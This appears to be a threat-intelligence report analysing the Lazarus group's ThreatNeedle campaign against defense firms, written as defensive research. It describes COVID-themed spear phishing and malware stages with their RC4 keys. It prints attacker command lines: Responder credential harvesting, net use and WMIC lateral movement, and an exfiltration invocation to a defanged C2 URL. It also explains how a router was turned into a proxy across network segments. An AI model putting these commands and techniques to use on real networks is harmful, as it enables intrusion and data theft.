We’ve observed numerous activities by this notorious APT group targeting various industries. The group has changed target depending on the primary objective. Google TAG has recently published a post about a campaign by Lazarus targeting security researchers. After taking a closer look, we identified the malware used in those attacks as belonging to a family that we call ThreatNeedle. We have seen Lazarus attack various industries using this malware cluster before. In mid-2020, we realized that Lazarus was launching attacks on the defense industry using the ThreatNeedle cluster, an advanced malware cluster of Manuscrypt (a.k.a. NukeSped). While investigating this activity, we were able to observe the complete life cycle of an attack, uncovering more technical details and links to the group’s other campaigns.\n\n The group made use of COVID-19 themes in its spear-phishing emails, embellishing them with personal information gathered using publicly available sources. After gaining an initial foothold, the attackers gathered credentials and moved laterally, seeking crucial assets in the victim environment. We observed how they overcame network segmentation by gaining access to an internal router machine and configuring it as a proxy server, allowing them to exfiltrate stolen data from the intranet network to their remote server. So far organizations in more than a dozen countries have been affected.\n\n During this investigation we had a chance to look into the command-and-control infrastructure. The attackers configured multiple C2 servers for various stages, reusing several scripts we’ve seen in previous attacks by the group. Moreover, based on the insights so far, it was possible to figure out the relationship with other Lazarus group campaigns.\n\n The full article is available on Kaspersky Threat Intelligence. Customers of Kaspersky Intelligence reporting may contact: intelreports@kaspersky.com For more information please contact: ics-cert@kaspersky.com.\n\nLAZARUS TARGETS DEFENSE INDUSTRY 2\n\n\n-----\n\n## Initial infection\n\nIn this attack, spear phishing was used as the initial infection vector. Before\nlaunching the attack, the group studied publicly available information about the\ntargeted organization and identified email addresses belonging to various\ndepartments of the company.\n\nEmail addresses in those departments received phishing emails that either had a\nmalicious Word document attached or a link to one hosted on a remote server.\nThe phishing emails claimed to have urgent updates on today’s hottest topic –\nCOVID-19 infections. The phishing emails were carefully crafted and written on\nbehalf of a medical center that is part of the organization under attack.\n\nPhishing email with links to malicious documents\n\nThe attackers registered accounts with a public email service, making sure the\nsender’s email addresses looked similar to the medical center’s real email\naddress. The signature shown in the phishing emails included the actual personal\ndata of the deputy head doctor of the attacked organization’s medical center.\nThe attackers were able to find this information on the medical center’s public\nwebsite.\n\nA macro in the Microsoft Word document contained the malicious code\ndesigned to download and execute additional malicious software on the infected\nsystem.\n\nThe document contains information on the population health assessment\nprogram and is not directly related to the subject of the phishing email (COVID19), suggesting the attackers may not completely understand the meaning of the\ncontents they used.\n\nLAZARUS TARGETS DEFENSE INDUSTRY 3\n\n\n-----\n\nContents of malicious document\n\nThe content of the lure document was copied from an online post by a health\nclinic.\n\nOur investigation showed that the initial spear-phishing attempt was\nunsuccessful due to macros being disabled in the Microsoft Office installation of\nthe targeted systems. In order to persuade the target to allow the malicious\nmacro, the attacker sent another email showing how to enable macros in\nMicrosoft Office.\n\nEmail with instructions on enabling macros #1\n\nLAZARUS TARGETS DEFENSE INDUSTRY 4\n\n\n-----\n\nAfter sending the above email with explanations, the attackers realized that the\ntarget was using a different version of Microsoft Office and therefore required\na different procedure for enabling macros. The attackers subsequently sent\nanother email showing the correct procedure in a screenshot with a Russian\nlanguage pack.\n\nEmail with instructions on enabling macros #2\n\nThe content in the spear-phishing emails sent by the attackers from May 21 to\nMay 26, 2020, did not contain any grammatical mistakes. However, in subsequent\nemails the attackers made numerous errors, suggesting they may not be native\nRussian speakers and were using translation tools.\n\nLAZARUS TARGETS DEFENSE INDUSTRY 5\n\n\n-----\n\nEmail containing several grammatical mistakes\n\nOn June 3, 2020, one of the malicious attachments was opened by employees\nand at 9:30 am local time the attackers gained remote control of the infected\nsystem.\n\nThis group also utilized different types of spear-phishing attack. One of the\ncompromised hosts received several spear-phishing documents on May 19, 2020.\nThe malicious file that was delivered, named Boeing_AERO_GS.docx, fetches a\ntemplate from a remote server.\n\nHowever, no payload created by this malicious document could be discovered.\nWe speculate that the infection from this malicious document failed for a\nreason unknown to us. A few days later, the same host opened a different\nmalicious document. The threat actor wiped these files from disk after the initial\ninfection meaning they could not be obtained.\n\nNonetheless a related malicious document with this malware was retrieved\nbased on our telemetry. It creates a payload and shortcut file and then\ncontinues executing the payload by using the following command line\nparameters.\n\n          - Payload path: %APPDATA%\\Microsoft\\Windows\\lconcaches.db\n\n           - Shortcut path: %APPDATA%\\Microsoft\\Windows\\Start\n```\n            Menu\\Programs\\Startup\\OneDrives.lnk\n\n```\n          - Command Line; please note that the string at the end is hard-coded, but\n\ndifferent for each sample:\n```\n            o rundll32.exe [dllpath],Dispatch n2UmQ9McxUds2b29\n\n```\nThe content of the decoy document depicts the job description of a\ngenerator/power industry engineer.\n\nLAZARUS TARGETS DEFENSE INDUSTRY 6\n\n\n-----\n\nDecoy document\n\n## Malware implants\n\nUpon opening a malicious document and allowing the macro, the malware is\ndropped and proceeds to a multistage deployment procedure. The malware\nused in this campaign belongs to a known malware cluster we named\nThreatNeedle. We attribute this malware family to the advanced version of\nManuscrypt (a.k.a. NukeSped), a family belonging to the Lazarus group. We\npreviously observed the Lazarus group utilizing this cluster when attacking\ncryptocurrency businesses and a mobile game company. Although the malware\ninvolved and the entire infection process is known and has not changed\ndramatically compared to previous findings, the Lazarus group continued using\nThreatNeedle malware aggressively in this campaign.\n\nLAZARUS TARGETS DEFENSE INDUSTRY 7\n\n\n-----\n\nInfection procedure\n\nThe payload created by the initial spear-phishing document loads the next stage\nas a backdoor running in-memory – the ThreatNeedle backdoor. ThreatNeedle\noffers functionality to control infected victims. The actor uses it to carry out\ninitial reconnaissance and deploy additional malware for lateral movement. When\nmoving laterally, the actor uses ThreatNeedle installer-type malware in the\nprocess. This installer is responsible for implanting the next stage loader-type\nmalware and registering it for auto-execution in order to achieve persistence.\nThe ThreatNeedle loader-type malware exists in several variations and serves\nthe primary purpose of loading the final stage of the ThreatNeedle malware inmemory.\n\n### ThreatNeedle installer\n\nUpon launch, the malware decrypts an embedded string using RC4 (key: B6 B7\n```\n        2D 8C 6B 5F 14 DF B1 38 A1 73 89 C1 D2 C4) and compares it to\n\n```\n“7486513879852”. If the user executes this malware without a command line\nparameter, the malware launches a legitimate calculator carrying a dark icon of\nthe popular Avengers franchise.\n\nFurther into the infection process, the malware chooses a service name\nrandomly from netsvc in order to use it for the payload creation path. The\nmalware then creates a file named bcdbootinfo.tlp in the system folder\ncontaining the infection time and the random service name that is chosen. We’ve\ndiscovered that the malware operator checks this file to see whether the\nremote host was infected and, if so, when the infection happened.\n\nIt then decrypts the embedded payload using the RC4 algorithm, saves it to an\n.xml extension with a randomly created five-character file name in the current\ndirectory and then copies it to the system folder with a .sys extension.\n\nLAZARUS TARGETS DEFENSE INDUSTRY 8\n\n\n-----\n\nThis final payload is the ThreatNeedle loader running in memory. At this point the\nloader uses a different RC4 key (3D 68 D0 0A B1 0E C6 AF DD EE 18 8E F4 A1\n```\n        D6 20), and the dropped malware is registered as a Windows service and\n\n```\nlaunched. In addition, the malware saves the configuration data as a registry key\nencrypted in RC4:\n\n          - `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameConfig -`\n```\n            Description\n\n### ThreatNeedle loader\n\n```\nThis component is responsible for loading the final backdoor payload into\nmemory. In order to do this, the malware uses several techniques to decrypt its\npayload:\n\n          - Loading the payload from the registry.\n\n          - Loading the payload from itself after decrypting RC4 and\n\ndecompression.\n\n          - Loading the payload from itself after decrypting AES and decompression.\n\n          - Loading the payload from itself after decompression.\n\n          - Loading the payload from itself after one-byte XORing.\n\nMost loader-style malware types check the command line parameter and only\nproceed with the malicious routine if an expected parameter is given. This is a\ncommon trait in ThreatNeedle loaders. The most common example we’ve seen is\nsimilar to the ThreatNeedle installer – the malware decrypts an embedded string\nusing RC4, and compares it with the parameter “Sx6BrUk4v4rqBFBV” upon launch.\nIf it matches, the malware begins decrypting its embedded payload using the\nsame RC4 key. The decrypted payload is an archive file which is subsequently\ndecompressed in the process. Eventually, the ThreatNeedle malware spawns in\nmemory.\n\nThe other variant of the loader is preparing the next stage payload from the\nvictim's registry. As we can see from the installer malware description, we\nsuspect that the registry key was created by the installer component. Retrieved\ndata from the registry is decrypted using RC4 and then decompressed.\nEventually, it gets loaded into memory and the export function is invoked.\n\n### ThreatNeedle backdoor\n\nThe final payload executed in memory is the actual ThreatNeedle backdoor. It\nhas the following functionality to control infected victim machines:\n\nLAZARUS TARGETS DEFENSE INDUSTRY 9\n\n\n-----\n\n          - Manipulate files/directories\n\n          - System profiling\n\n          - Control backdoor processes\n\n          - Enter sleeping or hibernation mode\n\n          - Update backdoor configuration\n\n          - Execute received commands\n\n## Post-exploitation phase\n\nFrom one of the hosts, we discovered that the actor executed a credential\n[harvesting tool named Responder](https://github.com/lgandx/Responder/) and moved laterally using Windows\ncommands. Lazarus overcame network segmentation, exfiltrating data from a\ncompletely isolated network segment cut off from the internet by compromising\na router virtual machine, as we explain below under “Overcoming network\nsegmentation”.\n\nJudging by the hosts that were infected with the ThreatNeedle backdoors postexploitation, we speculate that the primary intention of this attack is to steal\nintellectual property. Lastly, the stolen data gets exfiltrated using a custom tool\nthat will be described in the “Exfiltration” section. Below is a rough timeline of the\ncompromise we investigated:\n\nTimeline of infected hosts\n\nLAZARUS TARGETS DEFENSE INDUSTRY 10\n\n\n-----\n\n### Credential gathering\n\nDuring the investigation we discovered that the Responder tool was executed\nfrom one of the victim machines that had received the spear-phishing\ndocument. One day after the initial infection, the malware operator placed the\ntool onto this host and executed it using the following command:\n\n           - `[Responder file path] -i [IP address] -rPv`\n\nSeveral days later, the attacker started to move laterally originating from this\nhost. Therefore, we assess that the attacker succeeded in acquiring login\ncredentials from this host and started using them for further malicious activity.\n\n### Lateral movement\n\nAfter acquiring the login credentials, the actor started to move laterally from\nworkstations to server hosts. Typical lateral movement methods were employed,\nusing Windows commands. First, a network connection with a remote host was\nestablished using the command “net use”.\n\n           - `net use \\\\[IP address]\\IPC$ \"[password]\" /u:\"[user name]\" >`\n```\n            $temp\\~tmp5936t.tmp 2>&1\"\n\n```\nNext, the actor copied malware to the remote host using the Windows\nManagement Instrumentation Command-line (WMIC).\n\n           - `wmic.exe /node:[IP address] /user:\"[user name]\"`\n```\n            /password:\"[password]\" PROCESS CALL CREATE \"cmd.exe /c\n            $appdata\\Adobe\\adobe.bat\"\n\n```\n           - `wmic.exe /node:[IP address] /user:\"[user name]\"`\n```\n            /password:\"[password]\" PROCESS CALL CREATE \"cmd /c sc queryex\n            helpsvc > $temp\\tmp001.dat\"\n\n### Overcoming network segmentation\n\n```\nIn the course of this research, we identified another highly interesting technique\nused by the attackers for lateral movement and exfiltration of stolen data. The\nenterprise network under attack was divided into two segments: corporate (a\nnetwork on which computers had internet access) and restricted (a network on\nwhich computers hosted sensitive data and had no internet access). According\nto corporate policies, no transfer of information was allowed between these two\nsegments. In other words, the two segments were meant to be completely\nseparated.\n\nInitially, the attackers were able to get access to systems with internet access\nand spent a long time distributing malware between machines in the network’s\n\nLAZARUS TARGETS DEFENSE INDUSTRY 11\n\n\n-----\n\ncorporate segment. Among the compromised machines were those used by the\nadministrators of the enterprise’s IT infrastructure.\n\nIt is worth noting that the administrators could connect both to the corporate\nand the restricted network segments to maintain systems and provide users\nwith technical support in both zones. As a result, by gaining control of\nadministrator workstations the attackers were able to access the restricted\nnetwork segment.\n\nHowever, since directly routing traffic between the segments was not possible,\nthe attackers couldn’t use their standard malware set to exfiltrate data from the\nrestricted segment to the C2.\n\nThe situation changed on July 2 when the attackers managed to obtain the\ncredentials for the router used by the administrators to connect to systems in\nboth segments. The router was a virtual machine running CentOS to route\ntraffic between several network interfaces based on predefined rules.\n\nConnection layout between victim’s network segments\n\nAccording to the evidence collected, the attackers scanned the router’s ports\n[and detected a Webmin](https://www.webmin.com/) interface. Next, the attackers logged in to the web\ninterface using a privileged root account. It’s unknown how the attackers were\nable to obtain the credentials for that account, but it’s possible the credentials\nwere saved in one of the infected system’s browser password managers.\n\nLAZARUS TARGETS DEFENSE INDUSTRY 12\n\n\n-----\n\nLog listing Webmin web interface logins\n\nBy gaining access to the configuration panel the attackers configured the\nApache web server and started using the router as a proxy server between the\norganization’s corporate and restricted segments.\n\nList of services used on the router\n\nSeveral days after that, on July 10, 2020, the attackers connected to the router\n[via SSH and set up the PuTTy PSCP (the PuTTY Secure Copy client) utility on](https://www.ssh.com/ssh/putty/putty-manuals/0.68/Chapter5.html)\none of the infected machines. This utility was used to upload malware to the\nrouter VM. This enabled the attackers to place malware onto systems in the\nrestricted segment of the enterprise network, using the router to host the\nsamples. In addition, malware running in the network’s restricted segment was\nable to exfiltrate the collected data to the command-and-control server via the\nApache server set up on the same router.\n\nLAZARUS TARGETS DEFENSE INDUSTRY 13\n\n\n-----\n\nNew connection layout after attacker’s intrusion\n\nIn the course of the investigation we identified malware samples with the\nhardcoded URL of the router used as a proxy server.\n\nHardcoded proxy address in the malware\n\nSince the attackers regularly deleted log files from the router, only a handful of\ncommands entered to the command line via SSH could be recovered. An analysis\nof these commands shows that the attackers tried to reconfigure traffic routing\nusing the route command.\n\nAttacker commands\n\nThe attackers also ran the nmap utility on the router VM and scanned ports on\nsystems within the restricted segment of the enterprise network. On September\n27, the attackers started removing all traces of their activity from the router,\nusing the logrotate utility to set up automatic deletion of log files.\n\nLAZARUS TARGETS DEFENSE INDUSTRY 14\n\n\n-----\n\nWebmin log\n\n### Exfiltration\n\nWe observed that the malware operator attempted to create SSH tunnels to a\nremote server located in South Korea from several compromised server hosts.\nThey used a custom tunneling tool to achieve this. The tool receives four\nparameters: client IP address, client port, server IP address and server port. The\ntool offers basic functionality, forwarding client traffic to the server. In order to\ncreate a covert channel, the malware encrypts forwarded traffic using trivial\nbinary encryption.\n\nEncryption routine\n\nUsing the covert channel, the adversary copied data from the remote server\nover to the host using the PuTTy PSCP tool:\n\n           - `%APPDATA%\\PBL\\unpack.tmp -pw [password] root@[IP`\n```\n            address]:/tmp/cab0215 %APPDATA%\\PBL\\cab0215.tmp\n\n```\nAfter copying data from the server, the actor utilized the custom tool to\nexfiltrate stolen data to the remote server. This malware looks like a legitimate\nVNC client and runs like one if it’s executed without any command line\nparameters.\n\nLAZARUS TARGETS DEFENSE INDUSTRY 15\n\n\n-----\n\nExecution of malware without parameters\n\nHowever, if this application is executed with specific command line parameters,\nit runs an alternate, malicious function. According to our telemetry, the actor\nexecuted this application with six parameters:\n\n           - `%APPDATA%\\Comms\\Comms.dat S0RMM-50QQE-F65DN-DCPYN-5QEQA`\n```\n            hxxps://www.gonnelli[.]it/uploads/catalogo/thumbs/thumb[.]asp\n            %APPDATA%\\Comms\\cab59.tmp FL0509 15000\n\n```\nAlso, if the number of command line parameters is greater than six, the malware\njumps into a malicious routine. The malware also checks the length of the second\nargument – if it’s less than 29 characters, it terminates the execution. When the\nparameter checking procedure has passed successfully, the malware starts to\ndecrypt its next payload.\n\nThe embedded payload gets decrypted via XOR, where each byte from the end\nof the payload gets applied to the preceding byte. Next, the XORed blob\nreceives the second command line argument that’s provided (in this case `S0RMM-`\n```\n        50QQE-F65DN-DCPYN-5QEQA). The malware can accept more command line\n\n```\narguments, and depending on its number it runs differently. For example, it can\nalso receive proxy server addresses with the “-p” option.\n\nWhen the decrypted in-memory payload is executed, it compares the header of\nthe configuration data passed with the string “0x8406” in order to confirm its\nvalidity. The payload opens a given file (in this example\n```\n        %APPDATA%\\Comms\\cab59.tmp) and starts exfiltrating it to the remote server.\n\n```\nLAZARUS TARGETS DEFENSE INDUSTRY 16\n\n\n-----\n\nWhen the malware uploads data to the C2 server, it uses HTTP POST requests\nwith two parameters named ‘fr’ and ‘fp’:\n\n          - The ‘fr’ parameter contains the file name from the command line\n\nargument to upload.\n\n          - The ‘fp’ parameter contains the base64 encoded size, CRC32 value of\n\ncontent and file contents.\n\nContents of fp parameter\n\n## Attribution\n\nWe have been tracking ThreatNeedle malware for more than two years and are\nhighly confident that this malware cluster is attributed only to the Lazarus group.\nDuring this investigation, we were able to find connections to several clusters of\nthe Lazarus group.\n\nConnections between Lazarus campaigns\n\nLAZARUS TARGETS DEFENSE INDUSTRY 17\n\n\n-----\n\n### Connection with DeathNote cluster\n\nDuring this investigation we identified several connections with the DeathNote\n[(a.k.a. Operation Dream Job) cluster of the Lazarus group. First of all, among the](https://www.clearskysec.com/operation-dream-job/)\nhosts infected by the ThreatNeedle malware, we discovered one that was also\ninfected with the DeathNote malware, and both threats used the same C2\nserver URLs.\n\nIn addition, while analyzing the C2 server used in this attack, we found a custom\nweb shell script that was also discovered on the DeathNote C2 server. We also\nidentified that the server script corresponding to the Trojanized VNC Uploader\nwas found on the DeathNote C2 server.\n\nAlthough DeathNote and this incident show different TTPs, both campaigns\nshare command and control infrastructure and some victimology.\n\n### Connection with Operation AppleJeus\n\n[We also found a connection with Operation AppleJeus. As we described, the](https://securelist.com/operation-applejeus/87553/)\nactor used a homemade tunneling tool in the ThreatNeedle campaign that has a\ncustom encryption routine to create a covert channel. This very same tool was\nutilized in operation AppleJeus as well.\n\nSame tunneling tool\n\n### Connection with Bookcode cluster\n\n[In our previous blog about Lazarus group, we mentioned the Bookcode cluster](https://securelist.com/lazarus-covets-covid-19-related-intelligence/99906/)\nattributed to Lazarus group; and recently the Korea Internet and Security\n[Agency (KISA) also published](https://www.krcert.or.kr/data/reportView.do?bulletin_writing_sequence=35471) a report about the operation. In the report, they\nmentioned a malware cluster named LPEClient used for profiling hosts and\nfetching next stage payloads. While investigating this incident, we also found\nLPEClient from the host infected with ThreatNeedle. So, we assess that the\nThreatNeedle cluster is connected to the Bookcode operation.\n\nLAZARUS TARGETS DEFENSE INDUSTRY 18\n\n\n-----\n\n## Conclusions\n\nIn recent years, the Lazarus group has focused on attacking financial institutions\naround the world. However, beginning in early 2020, they focused on\naggressively attacking the defense industry. While Lazarus has also previously\nutilized the ThreatNeedle malware used in this attack when targeting\ncryptocurrency businesses, it is currently being actively used in cyberespionage\nattacks.\n\nThis investigation allowed us to create strong ties between multiple campaigns\nthat Lazarus has conducted, reinforcing our attribution. In this campaign the\nLazarus group demonstrated its sophistication level and ability to circumvent\nthe security measures they face during their attacks, such as network\nsegmentation. We assess that Lazarus is a highly prolific group, conducting\nseveral campaigns using different strategies. They shared tools and\ninfrastructure among these campaigns to accomplish their goals.\n\nLAZARUS TARGETS DEFENSE INDUSTRY 19\n\n\n-----\n\n## Appendix I – Indicators of Compromise\n```\nMalicious
